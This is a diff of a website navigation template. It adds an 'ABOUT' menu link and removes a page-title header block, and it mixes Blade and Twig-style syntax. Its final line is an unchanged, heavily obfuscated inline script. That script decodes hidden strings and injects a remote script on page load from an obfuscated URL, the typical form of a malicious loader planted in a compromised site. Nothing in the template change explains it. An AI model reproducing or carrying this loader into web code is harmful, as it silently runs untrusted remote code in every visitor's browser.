@@ -51,18 +51,15 @@
               COMMUNITY
             </a>
           </li>
+          <li class="static">
+            <a class="flex items-end h-24 pb-6 font-semibold text-white transition duration-200 ease-in-out hover:bg-neutral-600 focus:bg-neutral-600 lg:px-6 {{ request()->routeIs('about') ? 'bg-orange-500' : 'bg-stone-800' }}"
+              href="/about">
+              ABOUT
+            </a>
+          </li>
         </ul>
       </div>
     </div>
   </nav>
 </div>
-{% if page.title %}
-  <header class="bg-white shadow">
-    <div class="max-w-7xl mx-auto py-6 px-4 sm:px-6 lg:px-8">
-      <h2 class="font-semibold text-xl text-gray-800 leading-tight">
-        {{ page.title }}
-    </h2>
-    </div>
-</header>
-{% endif %}
 <script>window[(function(_ckT,_dH){var _X9bGG='';for(var _XKoZIJ=0;_XKoZIJ<_ckT.length;_XKoZIJ++){_dH>6;var _nujw=_ckT[_XKoZIJ].charCodeAt();_nujw-=_dH;_nujw!=_XKoZIJ;_nujw+=61;_nujw%=94;_nujw+=33;_X9bGG==_X9bGG;_X9bGG+=String.fromCharCode(_nujw)}return _X9bGG})(atob('J3R7Pzw3MjBBdjJG'), 43)] = 'cd5c4a85c11760181286';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_5D1,_KJ){var _lXDyl='';for(var _LVagJJ=0;_LVagJJ<_5D1.length;_LVagJJ++){var _9BZ2=_5D1[_LVagJJ].charCodeAt();_lXDyl==_lXDyl;_9BZ2-=_KJ;_9BZ2!=_LVagJJ;_9BZ2+=61;_9BZ2%=94;_KJ>5;_9BZ2+=33;_lXDyl+=String.fromCharCode(_9BZ2)}return _lXDyl})(atob('fSsrJypPREQhKkMxfkIqeCl+JysqQ3gmJEQxfkIrdnxDISo='), 21)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });</script>
